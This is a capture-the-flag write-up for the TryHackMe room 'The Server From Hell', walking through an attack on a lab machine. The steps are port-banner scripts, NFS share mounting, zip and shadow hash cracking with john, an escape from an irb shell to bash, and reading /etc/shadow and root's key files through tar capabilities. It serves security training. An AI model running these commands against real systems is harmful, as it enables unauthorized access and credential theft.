# The Server From Hell

## Introduction:

Welcome to my another writeup! In this TryHackMe [The Server From Hell](https://tryhackme.com/room/theserverfromhell) room, you'll learn: Writing custom python script to bruteforce open ports, NFS enumeration, privilege escalation via `tar`'s capabilities! Without further ado, let's dive in.

## Background

> Face a server that feels as if it was configured and deployed by Satan himself. Can you escalate to root?

> Difficulty: Medium

```
Start at port 1337 and enumerate your way.
Good luck.
```

- Overall difficulty for me: Very easy
   - Initial foothold: Very easy
   - Privilege escalation: Very easy

# Service Enumeration

**Export target machine's IP to environment variable:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Server-From-Hell]
└─# export RHOSTS=10.10.184.23
```

## Port 1337

Let's start at port 1337 as this room's description!

**We can connect to a open port via `nc`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Server-From-Hell]
└─# nc -nv $RHOSTS 1337
(UNKNOWN) [10.10.184.23] 1337 (?) open
Welcome traveller, to the beginning of your journey
To begin, find the trollface
Legend says he's hiding in the first 100 ports
Try printing the banners from the ports
```

The trollface is hiding in **the first 100 ports**...

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Server-From-Hell]
└─# nc -nv $RHOSTS 1          
(UNKNOWN) [10.10.184.23] 1 (tcpmux) open
550 12345 0000000000000000000000000000000000000000000000000000000                                                                                               

┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Server-From-Hell]
└─# nc -nv $RHOSTS 2   
(UNKNOWN) [10.10.184.23] 2 (?) open
550 12345 0000000000000000000000000000000000000000000000000000000
```

**Hmm... Why not writing a [simple python script](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Server-From-Hell/enum_first100ports.py) to automate this process? :D**
```py
#!/usr/bin/env python3

import socket

rhost = "10.10.184.23"

for port in range(1, 101):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((rhost, port))
	msg = s.recv(1024)
	print(msg.decode('utf-8'))
	s.close()
```

**Output:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Server-From-Hell]
└─# python3 enum_first100ports.py
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff00
550 12345 0fffffffffffff777778887777777777cffffffffffffffffffff00
550 12345 0fffffffffff8000000000000000008888887cfcfffffffffffff00
550 12345 0ffffffffff80000088808000000888800000008887ffffffffff00
550 12345 0fffffffff70000088800888800088888800008800007ffffffff00
550 12345 0fffffffff000088808880000000000000088800000008fffffff00
550 12345 0ffffffff80008808880000000880000008880088800008ffffff00
550 12345 0ffffffff000000888000000000800000080000008800007fffff00
550 12345 0fffffff8000000000008888000000000080000000000007fffff00
550 12345 0ffffff70000000008cffffffc0000000080000000000008fffff00
550 12345 0ffffff8000000008ffffff007f8000000007cf7c80000007ffff00
550 12345 0fffff7880000780f7cffff7800f8000008fffffff80808807fff00
550 12345 0fff78000878000077800887fc8f80007fffc7778800000880cff00
550 12345 0ff70008fc77f7000000f80008f8000007f0000000000000888ff00
550 12345 0ff0008f00008ffc787f70000000000008f000000087fff8088cf00
550 12345 0f7000f800770008777 go to port 12345 80008f7f700880cf00
550 12345 0f8008c008fff8000000000000780000007f800087708000800ff00
550 12345 0f8008707ff07ff8000008088ff800000000f7000000f800808ff00
550 12345 0f7000f888f8007ff7800000770877800000cf780000ff00807ff00
550 12345 0ff0808800cf0000ffff70000f877f70000c70008008ff8088fff00
550 12345 0ff70800008ff800f007fff70880000087f70000007fcf7007fff00
550 12345 0fff70000007fffcf700008ffc778000078000087ff87f700ffff00
550 12345 0ffffc000000f80fff700007787cfffc7787fffff0788f708ffff00
550 12345 0fffff7000008f00fffff78f800008f887ff880770778f708ffff00
550 12345 0ffffff8000007f0780cffff700000c000870008f07fff707ffff00
550 12345 0ffffcf7000000cfc00008fffff777f7777f777fffffff707ffff00
550 12345 0cccccff0000000ff000008c8cffffffffffffffffffff807ffff00
550 12345 0fffffff70000000ff8000c700087fffffffffffffffcf808ffff00
550 12345 0ffffffff800000007f708f000000c0888ff78f78f777c008ffff00
550 12345 0fffffffff800000008fff7000008f0000f808f0870cf7008ffff00
550 12345 0ffffffffff7088808008fff80008f0008c00770f78ff0008ffff00
550 12345 0fffffffffffc8088888008cffffff7887f87ffffff800000ffff00
550 12345 0fffffffffffff7088888800008777ccf77fc777800000000ffff00
550 12345 0fffffffffffffff800888880000000000000000000800800cfff00
550 12345 0fffffffffffffffff70008878800000000000008878008007fff00
550 12345 0fffffffffffffffffff700008888800000000088000080007fff00
550 12345 0fffffffffffffffffffffc800000000000000000088800007fff00
550 12345 0fffffffffffffffffffffff7800000000000008888000008ffff00
550 12345 0fffffffffffffffffffffffff7878000000000000000000cffff00
550 12345 0ffffffffffffffffffffffffffffffc880000000000008ffffff00
550 12345 0ffffffffffffffffffffffffffffffffff7788888887ffffffff00
550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff00
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
```

**If you look closer, it has a hint:**
```
550 12345 0f7000f800770008777 go to port 12345 80008f7f700880cf00
```

**Let's use `nc` to connect to port 12345!** 
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Server-From-Hell]
└─# nc -nv $RHOSTS 12345 
(UNKNOWN) [10.10.184.23] 12345 (?) open
NFS shares are cool, especially when they are misconfigured
It's on the standard port, no need for another scan
```

> Note: NFS standard port is on 2049.

## NFS on Port 2049

**Show mounted share via `showmount`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Server-From-Hell]
└─# showmount -e $RHOSTS      
Export list for 10.10.184.23:
/home/nfs *
```

**Found `/home/nfs` mount!**

**Mounting share via `mount`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Server-From-Hell]
└─# mkdir nfs-share
                                                                                               
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Server-From-Hell]
└─# mount -t nfs $RHOSTS:/home/nfs ./nfs-share
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Server-From-Hell]
└─# ls -lah nfs-share 
[...]
-rw-r--r-- 1 root   root    4.5K Sep 15  2020 backup.zip
```

**Let's `cp` that `backup.zip`!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Server-From-Hell]
└─# cp nfs-share/backup.zip .     
                                                                                               
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Server-From-Hell]
└─# file backup.zip 
backup.zip: Zip archive data, at least v1.0 to extract, compression method=store
```

**Let's `unzip` it:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Server-From-Hell]
└─# unzip backup.zip 
Archive:  backup.zip
   creating: home/hades/.ssh/
[backup.zip] home/hades/.ssh/id_rsa password: 
   skipping: home/hades/.ssh/id_rsa  incorrect password
   skipping: home/hades/.ssh/hint.txt  incorrect password
   skipping: home/hades/.ssh/authorized_keys  incorrect password
   skipping: home/hades/.ssh/flag.txt  incorrect password
   skipping: home/hades/.ssh/id_rsa.pub  incorrect password
```

Ahh... It needs a password. **We can use `zip2john` and `john` to crack it!**

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Server-From-Hell]
└─# zip2john backup.zip > backup.hash

┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Server-From-Hell]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash 
[...]
{Redacted}          (backup.zip)
```

**Found the ZIP password! Let's `unzip` that!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Server-From-Hell]
└─# unzip backup.zip
Archive:  backup.zip
[backup.zip] home/hades/.ssh/id_rsa password: 
  inflating: home/hades/.ssh/id_rsa  
 extracting: home/hades/.ssh/hint.txt  
  inflating: home/hades/.ssh/authorized_keys  
 extracting: home/hades/.ssh/flag.txt  
  inflating: home/hades/.ssh/id_rsa.pub
```

**Found private SSH key! (`id_rsa`)**

```
┌──(root🌸siunam)-[~/…/The-Server-From-Hell/home/hades/.ssh]
└─# cat id_rsa    
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEAvvpYFMo61B9W+h5uWUdo+jqj9RjFiaQ4JvGeLI9Ktl8aBZxPngNy
d5VDFEslFfgbYUhYgNmU2xTaWPK0HweuyauIizV4QLA9KEvVMAz+2W8yhcSrUDpU0fosol
GH5TmQxBS9NT/mzwSjskweoMbCz9mKQ9Zl49RmqGg8pZI3FoaSwTwD8+ysEoF1RKTNi6AB
NGHq/00qadmMLtM2KgFdJNi6S6fVjpwwvlVhCvcdqYoHjpzX94PoQpzqYlbi5hqvPVG/Vj
7eWBDHzL6kapx32IsSNfqT7rFfN+atMP3/ofJEojngBb4gvEoAZ3tzB08Ee6Z4OTtlbFA8
840rQXOTwxXAqdvFdO23k3uBbX/EMDV19ZkBz3+R/JGlryWCf4bCBmwSxNZufi1aQmqIMV
msnBq0DKPYqq9jziHqUqFvZMxHR1VjCYAnq83VKpDoI9Jl9KgvKzHOZtriQqTy9MM6/peh
NGUIICl3REw4v5Cq0HDPHVc5kfL37tp3VxcX5C5zoxIi6jKkSvXGjRftcK9pGdLRCktcWp
[...]
```

Now, **we found a username called `hades`, and his private SSH key!**

```
┌──(root🌸siunam)-[~/…/The-Server-From-Hell/home/hades/.ssh]
└─# cat hint.txt       
2500-4500
```

**flag.txt:**
```
┌──(root🌸siunam)-[~/…/The-Server-From-Hell/home/hades/.ssh]
└─# cat flag.txt   
thm{Redacted}
```

# Initial Foothold

**In the `hint.txt`, it indicacts that the SSH service is opened at range from 2500 to 4500!**

**Again, we can write a [simple python script](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Server-From-Hell/ssh_enum.py) to find which port is the SSH service:**
```py
#!/usr/bin/env python3

import os

rhost = '10.10.184.23'

for port in range(2500, 4500):
   os.system(f'ssh -i ./home/hades/.ssh/id_rsa hades@{rhost} -p {port}')
```

**Output:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Server-From-Hell]
└─# python3 ssh_enum.py
[...]
kex_exchange_identification: read: Connection reset by peer
Connection reset by 10.10.184.23 port 3332
The authenticity of host '[10.10.184.23]:3333 ([10.10.184.23]:3333)' can't be established.
ED25519 key fingerprint is SHA256:Zj1jn6b0042OHU6nvWMtd/PCNk57yPlHaXTatTQuKuQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? 
```

Found it! **The SSH service is on port 3333.**

**We now can `ssh` into user `hades` with the private SSH key! :D**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Server-From-Hell]
└─# ssh -i ./home/hades/.ssh/id_rsa hades@$RHOSTS -p 3333
[...]
 ██░ ██ ▓█████  ██▓     ██▓    
▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▒██▀▀██░▒███   ▒██░    ▒██░    
░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░  ░░ ░   ░     ░ ░     ░ ░   
 ░  ░  ░   ░  ░    ░  ░    ░  ░
                               
 Welcome to hell. We hope you enjoy your stay!
 irb(main):001:0> 
```

Hmm?? What the shell?

**After googling, I found that this is a ruby shell (`irb`).**

**If I'm inside a ruby shell, we can call an OS command. In ruby, we can do this via `system()`, which is like python's `os.system()`.**
```
 irb(main):001:0> system('ls')
user.txt
=> true
```

I can execute command!

**How about spawn a bash shell?**
```
irb(main):003:0> system('/bin/bash')
hades@hell:~$ whoami;hostname;id;ip a
hades
hell
uid=1002(hades) gid=1002(hades) groups=1002(hades)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:11:56:4b:ec:e1 brd ff:ff:ff:ff:ff:ff
    inet 10.10.184.23/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3266sec preferred_lft 3266sec
    inet6 fe80::11:56ff:fe4b:ece1/64 scope link 
       valid_lft forever preferred_lft forever
```

We're `hades`!

**user.txt:**
```
hades@hell:~$ cat /home/hades/user.txt 
thm{Redacted}
```

# Privilege Escalation

## hades to root

By enumerating manaully, **I found the `tar` binary has a weird capabilities:**

**Capabilities:**
```
hades@hell:~$ getcap -r / 2>/dev/null
[...]
/bin/tar = cap_dac_read_search+ep
```

> `cap_dac_read_search` allows to **ignore the read permission bits** and does also allow to execute the system call `open_by_handle_at` which can be used to read outside a container chroot. (Source: [StackOverflow](https://stackoverflow.com/questions/48329731/is-cap-dac-override-a-superset-of-cap-dac-read-search))

**According to [GTFOBins](https://gtfobins.github.io/gtfobins/tar/#file-read), we can reads data from files:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Server-From-Hell/images/a1.png)

**Which means I can read `/etc/shadow`??**
```
hades@hell:~$ tar xf /etc/shadow -I '/bin/sh -c "cat 1>&2"'
root:$6$gOnbjpUs${Redacted}/h9dOgaDaphveFY9ScIetMiI8F/XOnTxJxi1:18520:0:99999:7:::
[...]
```

Yes I can! :D

**Now, my theroy is: If user `hades` has a private SSH key, then user `root` should also has it!**
```
hades@hell:~$ tar xf /root/.ssh/id_rsa -I '/bin/sh -c "cat 1>&2"'
tar (child): /root/.ssh/id_rsa: Cannot open: No such file or directory
tar (child): Error is not recoverable: exiting now
/bin/tar: Child returned status 2
/bin/tar: Error is not recoverable: exiting now
```

Nope...

**Hmm... If we are able to read `/etc/shadow`, why not cracking root's hash?**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Server-From-Hell]
└─# nano root.hash  
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Server-From-Hell]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt root.hash        
[...]
{Redacted}         (root)
```

**Cracked! Let's Switch User to root!**
```
hades@hell:~$ su root
Password: 
root@hell:/home/hades# whoami;hostname;id;ip a
root
hell
uid=0(root) gid=0(root) groups=0(root)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:2b:4b:69:b7:5b brd ff:ff:ff:ff:ff:ff
    inet 10.10.130.204/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3096sec preferred_lft 3096sec
    inet6 fe80::2b:4bff:fe69:b75b/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

**root.txt:**
```
root@hell:~# cat /root/root.txt 
thm{Redacted}
```

# Conclusion

What we've learned:

1. Bruteforcing Open Ports via Custom Python Script
2. Enumerating NFS Share
3. Bruteforcing SSH Service Port via Custom Python Script
4. Privilege Escalation via Misconfigured binary `tar` Capabilities